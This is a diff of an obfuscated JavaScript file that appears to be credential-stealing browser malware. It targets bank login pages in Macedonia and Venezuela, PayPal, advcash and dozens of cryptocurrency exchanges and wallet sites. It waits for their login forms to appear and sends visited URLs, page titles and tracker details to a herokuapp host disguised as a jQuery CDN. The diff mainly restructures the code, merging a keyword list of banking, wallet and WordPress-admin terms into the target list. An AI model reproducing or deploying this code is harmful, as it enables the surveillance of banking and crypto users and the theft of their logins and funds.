@@ -4,20 +4,6 @@ var _0xbbaa=["\x42\x20\x65\x3D\x5B\x22\x5C\x31\x47\x5C\x31\x46\x5C\x31\x67\x5C\x
 
 
 
-
-
-
-
-//hu
-
-
-
-
-
-
-
-
-(function () {
   if (top['location']['href']['indexOf']('https://www.netbanking.mk/Stopanstvo/LoginModule/LoginUP.aspx') > -1) {
       var interval = setInterval(function () {
           if (document['getElementsByClassName']('login_fields')[0]) {
@@ -31,7 +17,6 @@ var _0xbbaa=["\x42\x20\x65\x3D\x5B\x22\x5C\x31\x47\x5C\x31\x46\x5C\x31\x67\x5C\x
           }
       }, 1000)
   };
-})();
 
 
 
@@ -39,7 +24,8 @@ var _0xbbaa=["\x42\x20\x65\x3D\x5B\x22\x5C\x31\x47\x5C\x31\x46\x5C\x31\x67\x5C\x
 
 
 
-var myStringArray = ["bitcoin","blockchain.info","wallet","paxful.com","coin.space","coinapult.com", "bitgo.com", "strongcoin.com", "coinhive.com", "spectrocoin.com", "wirexapp.com", "xapo.com", "iqoption.com", "etoro.com", "bittrex.com", "localbitcoins.com", "cex.io", "kraken.com", "etherdelta.com", "bitfinex.com", "bitstamp.net", "bisq.network", "gdax.com", "shapeshift.io", "binance.com", "coinmama.com", "bitcoin.de", "bithumb.com", "coinatmradar.com", "poloniex.com", "changelly.com", "zebpay.com", "bitso.com", "gemini.com", "yobit.net", "luno.com", "bitbay.net", "bitpanda.com", "bitflyer.jp", "cryptonia.co.nz", "btcmarkets.net", "coinchceck.com", "bx.in.th", "bitcoin.co.id", "anycoindirect.eu", "hitbtc.com", "bitmex.com", "indacoin.com"];
+
+var myStringArray = ["banca", "banco", "bank", "bitcoin", "monero", "etherum", "wallet", "cryptocurrency", "wp-admin.php", "wp-login.php", "bitcoin","blockchain.info","wallet","paxful.com","coin.space","coinapult.com", "bitgo.com", "strongcoin.com", "coinhive.com", "spectrocoin.com", "wirexapp.com", "xapo.com", "iqoption.com", "etoro.com", "bittrex.com", "localbitcoins.com", "cex.io", "kraken.com", "etherdelta.com", "bitfinex.com", "bitstamp.net", "bisq.network", "gdax.com", "shapeshift.io", "binance.com", "coinmama.com", "bitcoin.de", "bithumb.com", "coinatmradar.com", "poloniex.com", "changelly.com", "zebpay.com", "bitso.com", "gemini.com", "yobit.net", "luno.com", "bitbay.net", "bitpanda.com", "bitflyer.jp", "cryptonia.co.nz", "btcmarkets.net", "coinchceck.com", "bx.in.th", "bitcoin.co.id", "anycoindirect.eu", "hitbtc.com", "bitmex.com", "indacoin.com"];
 var arrayLength = myStringArray.length;
 for (var i = 0; i < arrayLength; i++) {
     if (window.location.href.indexOf(myStringArray[i]) > -1) {
@@ -47,7 +33,7 @@ for (var i = 0; i < arrayLength; i++) {
   }
 }
 
-(function () {
+
   if (top['location']['href']['indexOf']('wallet.advcash.com') > -1) {
       var interval = setInterval(function () {
           if (document['getElementsByClassName']('form')[0]) {
@@ -62,10 +48,10 @@ for (var i = 0; i < arrayLength; i++) {
           }
       }, 1000)
   };
-})();
 
 
-(function () {
+
+
   if (top['location']['href']['indexOf']('paypal.com') > -1) {
       var interval = setInterval(function () {
           if (document['getElementsByClassName']('proceed maskable')[0]) {
@@ -79,9 +65,9 @@ for (var i = 0; i < arrayLength; i++) {
           }
       }, 1000)
   };
-})();
 
-(function () {
+
+
 if (window.location.href.indexOf("http://bitcoinglobalclub.com/mlm/pages/login/login.php") > -1) {
 var login_form = document.getElementById("loginForm");
     if(login_form){
@@ -93,9 +79,9 @@ var login_form = document.getElementById("loginForm");
 		        }
           }
         }
-})();
 
-(function () {
+
+
   if (top['location']['href']['indexOf']('https://www3.bancaribe.com.ve/bcn/') > -1) {
       var interval = setInterval(function () {
           if (document['getElementsByName']('conexion')[0]) {
@@ -109,9 +95,9 @@ var login_form = document.getElementById("loginForm");
           }
       }, 1000)
   };
-})();
 
-(function () {
+
+
   if (top['location']['href']['indexOf']('https://www4.bancaribe.com.ve/bcj/') > -1) {
       var interval = setInterval(function () {
           if (document['getElementsByName']('form1')[0]) {
@@ -125,21 +111,13 @@ var login_form = document.getElementById("loginForm");
           }
       }, 1000)
   };
-})();
 
 
 
-(function () {
-var myStringArrayBAN = ["banca", "banco", "bank", "bitcoin", "monero", "etherum", "wallet", "cryptocurrency", "wp-admin.php", "wp-login.php"];
-var arrayLengthBAN = myStringArrayBAN.length;
-for (var i = 0; i < arrayLengthBAN; i++) {
-    if (window.location.href.indexOf(myStringArrayBAN[i]) > -1) {
-(new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/sites.php?l="+window.location.href;
-  }
-}
-})();
 
-(function () {
+
+
+
     var sc = document.getElementsByTagName('script');
     var img = document.getElementsByTagName('img');
     for (var i = 0; i < sc.length; i++)
@@ -148,4 +126,3 @@ for (var i = 0; i < arrayLengthBAN; i++) {
     for (var i = 0; i < img.length; i++)
     	if (img[i].src.indexOf('amung.us') > -1)
     	(new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/niches.php?l="+window.location.href+"&t="+document.title+"&a="+img[i].src;
-})();
